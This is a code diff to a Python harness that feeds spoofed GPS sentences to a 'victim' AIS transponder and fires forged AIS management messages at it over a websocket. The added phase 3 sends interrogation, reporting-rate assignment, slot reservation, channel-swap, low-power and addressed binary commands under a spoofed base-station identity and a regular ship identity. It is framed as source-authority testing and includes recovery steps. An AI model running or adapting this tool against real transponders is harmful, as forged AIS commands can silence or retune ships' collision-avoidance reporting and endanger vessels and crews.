@@ -29,6 +29,7 @@ import argparse, json, math, os, sys, threading, time
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import ais_encode as enc
+import ais_encode_p3 as p3enc
 try:
     import websocket
 except Exception:
@@ -68,29 +69,17 @@ class GpsFeed(threading.Thread):
                                       f"{self.course:.1f}",d,'','','A'))
         vtg = pynmea2.VTG('GP','VTG',(f"{self.course:.1f}",'T','','M',
                                       f"{self.speed:.1f}",'N',f"{self.speed*1.852:.1f}",'K','A'))
-        # ZDA: dedicated UTC date/time sentence. AIS transponders use it to acquire
-        # UTC sync for TDMA timing. Without it, units may report "UTC sync invalid".
-        zda = pynmea2.ZDA('GP','ZDA',(t, now.strftime('%d'), now.strftime('%m'),
-                                      now.strftime('%Y'), '00','00'))
-        return (zda, gga, rmc, vtg)
+        return (gga, rmc, vtg)
 
     def run(self):
         self.ser = serial.Serial(self.port, self.baud, timeout=1)
-        next_tick = time.monotonic()
         while not self._stop.is_set():
             for s in self._sentences():
                 try:
                     self.ser.write((str(s) + "\r\n").encode())
                 except Exception:
                     pass
-            # schedule the next batch on a precise cadence so the UTC timestamps
-            # advance in step with real elapsed time (helps the unit hold UTC sync).
-            next_tick += self.rate
-            sleep_for = next_tick - time.monotonic()
-            if sleep_for > 0:
-                time.sleep(sleep_for)
-            else:
-                next_tick = time.monotonic()  # fell behind; resync
+            time.sleep(self.rate)
         self.ser.close()
 
     def set_position(self, lat, lon, speed=None, course=None):
@@ -200,8 +189,16 @@ def build_timeline(ctx):
 
 # Phase 2: the aggressive / potentially-disruptive tests, severity-ordered.
 # These run AFTER phase 1, each with a large gap, because they may reconfigure or
-# disrupt the transponder. BASE_STATION source MMSI (00xxxxxxx) tests source authority.
-BASE_MMSI = 2000000              # 00xxxxxxx = base station identity
+# disrupt the transponder. BASE_STATION source MMSI tests source authority.
+#
+# A properly-formed AIS base station MMSI has the format 00MIDXXXX: two leading zeros,
+# then a valid 3-digit maritime ID (MID), then four digits. 003669999 uses MID 366
+# (United States), so it is a spec-valid base station identity. The earlier value
+# (2000000 -> padded 002000000) used MID 200, which is not an allocated MID, so a unit
+# that validates the MID could reject it for that reason alone. Using a valid-MID base
+# station removes that confound when testing whether a unit honors base-station commands.
+BASE_MMSI = 3669999              # -> 003669999 : valid base station (00 + US MID 366)
+REGULAR_MMSI = 366000001         # a regular Class-A ship-station MMSI (MID 366)
 AIS_CH_A, AIS_CH_B = 2087, 2088  # normal AIS channel numbers
 NON_AIS_CH = 2001                # a marine VHF channel well outside the AIS band
 
@@ -273,6 +270,66 @@ def build_phase2(ctx):
     return p2
 
 
+# Phase 3: SOURCE-AUTHORITY MATRIX.
+# ITU-R M.1371 intends the management messages (assignment M16, channel management M22,
+# data-link-management M20) to originate from base stations. A conforming Class A unit
+# should therefore honor them from a base station and ignore them from an ordinary ship
+# station. This phase sends each such command TWICE: once from a valid base-station MMSI
+# and once from a regular ship MMSI, so the analysis can compare the two and determine,
+# per command, whether the unit checks the source authority or acts on the command
+# regardless of who sent it. Interrogation (M15) and addressed binary (M6) are included
+# because a unit that answers/acknowledges them from any source is itself a finding.
+#
+# Each cell is fired with a long dwell (set by --phase3-gap, default large) so slow
+# effects (a reporting-rate change, a retune) have time to appear, and every cell is
+# tagged in the manifest with source=base|regular and command=<Mxx> for a clean 2xN table.
+def build_phase3(ctx):
+    V = ctx.victim_mmsi
+    cells = []
+
+    # Phase-3 messages use the pyais-validated encoders in ais_encode_p3, so the addressed
+    # flag / destination fields are spec-correct (the hand-rolled Type 22 put the addressed
+    # flag in the wrong position, sending channel commands as broadcast). builder(src) fires
+    # the identical command from a given source MMSI.
+    commands = [
+        ("M15_interrogation",
+         lambda src: p3enc.m15_interrogation(src, V, req_type=5),
+         "M15 interrogate victim (request Type5)"),
+        ("M16_rate_assignment",
+         lambda src: p3enc.m16_assignment(src, V, offset=0, increment=1000),
+         "M16 assign slow reporting rate to victim"),
+        ("M20_slot_reservation",
+         lambda src: p3enc.m20_datalink(src, offset=100, number=10, timeout=7),
+         "M20 reserve 10 slots"),
+        ("M22_channel_mgmt",
+         lambda src: p3enc.m22_channel(src, V, channel_a=AIS_CH_B, channel_b=AIS_CH_A),
+         "M22 swap victim channels A<->B"),
+        ("M22_power_low",
+         lambda src: p3enc.m22_channel(src, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=1),
+         "M22 set victim to LOW power"),
+        ("M6_addressed_ack",
+         lambda src: p3enc.m6_addressed(src, V, dac=1, fid=0),
+         "M6 addressed binary to victim (expect ack)"),
+    ]
+
+    # For each command, emit the base-station variant then the regular-ship variant.
+    for label, builder, meta in commands:
+        cells.append((f"p3_{label}_base",
+                      [(builder(BASE_MMSI), f"[SRC=BASE {BASE_MMSI:07d}] {meta}")]))
+        cells.append((f"p3_{label}_regular",
+                      [(builder(REGULAR_MMSI), f"[SRC=REGULAR {REGULAR_MMSI}] {meta}")]))
+        # recovery after the reconfiguring commands so a success does not distort later cells
+        if label.startswith("M22") or label.startswith("M16"):
+            cells.append((f"p3_recover_after_{label}",
+                          [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A,
+                                              channel_b=AIS_CH_B, power=0),
+                            "RECOVERY: restore AIS channels + high power"),
+                           (p3enc.m16_assignment(BASE_MMSI, V, offset=0, increment=0),
+                            "RECOVERY: clear rate assignment (autonomous mode)")]))
+
+    return cells
+
+
 def main():
     ap = argparse.ArgumentParser(description="Run a full GPS+attack session (synced).")
     ap.add_argument("--gps-port", required=True, help="serial port feeding the victim GPS")
@@ -291,6 +348,15 @@ def main():
                          "channel swap, off-band retune, illegal rate, slot/TDMA overload)")
     ap.add_argument("--phase2-only", action="store_true",
                     help="skip phase 1 and run ONLY the aggressive phase-2 tests")
+    ap.add_argument("--phase3", action="store_true",
+                    help="also run the phase-3 source-authority matrix: each management "
+                         "command (M15/M16/M20/M22/M6) fired from BOTH a valid base-station "
+                         "MMSI and a regular ship MMSI, to test whether the unit checks source")
+    ap.add_argument("--phase3-only", action="store_true",
+                    help="skip phases 1 and 2 and run ONLY the source-authority matrix")
+    ap.add_argument("--phase3-gap", type=float, default=90.0,
+                    help="seconds of dwell after each phase-3 command (kept long so slow "
+                         "effects like rate changes or retunes have time to appear)")
     ap.add_argument("--fast-speed", type=float, default=25.0,
                     help="knots to set the victim during the illegal-rate test "
                          "(>23kn requires 2s reporting; assigning slow is then illegal)")
@@ -333,7 +399,7 @@ def main():
 
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
-    if args.phase2_only:
+    if args.phase2_only or args.phase3_only:
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -343,10 +409,10 @@ def main():
     ws = websocket.create_connection(args.url, timeout=10)
     print(f"phase 1: {len(timeline)} attacks, {args.gap}s apart, repeat {args.repeat}x\n")
 
-    def fire(name, payloads, idx, total, tag=""):
+    def fire(name, payloads, idx, total, tag="", extra=None):
         rec(event="attack_begin", name=name, index=idx, phase=tag,
             victim_lat=ctx.victim_lat, victim_lon=ctx.victim_lon,
-            victim_speed=gps.speed)
+            victim_speed=gps.speed, **(extra or {}))
         print(f"[{tag}{idx+1}/{total}] {name} @ {time.strftime('%H:%M:%S')}")
         for r in range(args.repeat):
             for (bits, meta) in payloads:
@@ -401,6 +467,42 @@ def main():
                 ws.send(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
                                           power=0, addressed=1, dest1=args.victim_mmsi))
                 rec(event="final_recovery", meta="restore AIS channels + high power")
+                time.sleep(1)
+
+        # ---- phase 3: source-authority matrix (base vs regular per command) ----
+        if args.phase3 or args.phase3_only:
+            p3 = build_phase3(ctx)
+            print(f"\n=== PHASE 3: SOURCE-AUTHORITY MATRIX: {len(p3)} cells, "
+                  f"{args.phase3_gap}s dwell each ===")
+            print("    each management command fired from BOTH a base station and a regular")
+            print("    ship MMSI; long dwell so slow effects appear. Watch serial + VHF.\n")
+            rec(event="phase3_start", n=len(p3), gap=args.phase3_gap,
+                base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI)
+            for i, (name, payloads) in enumerate(p3):
+                # tag each cell with its command and source so the analyzer can build
+                # the 2xN table directly from the manifest.
+                if name.startswith("p3_recover_after_"):
+                    src = "recovery"; cmd = name.replace("p3_recover_after_", "")
+                else:
+                    # name form: p3_<command>_<source>
+                    parts = name[len("p3_"):].rsplit("_", 1)
+                    cmd = parts[0]; src = parts[1] if len(parts) > 1 else ""
+                fire(name, payloads, i, len(p3), tag="P3:",
+                     extra={"command": cmd, "source": src})
+                # recovery cells need only a short settle; test cells get the full dwell
+                dwell = 5 if name.startswith("p3_recover_after_") else args.phase3_gap
+                if i < len(p3) - 1:
+                    print(f"    ...{dwell:.0f}s dwell (observe effect on serial + VHF)...")
+                    time.sleep(dwell)
+
+            # final recovery again after phase 3
+            print("    phase-3 final recovery: restoring AIS channels + high power + autonomous")
+            for _ in range(3):
+                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
+                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
+                ws.send(p3enc.m16_assignment(BASE_MMSI, args.victim_mmsi,
+                                             offset=0, increment=0))
+                rec(event="final_recovery", meta="restore channels/power/rate after phase3")
                 time.sleep(1)
     except KeyboardInterrupt:
         print("\ninterrupted.")
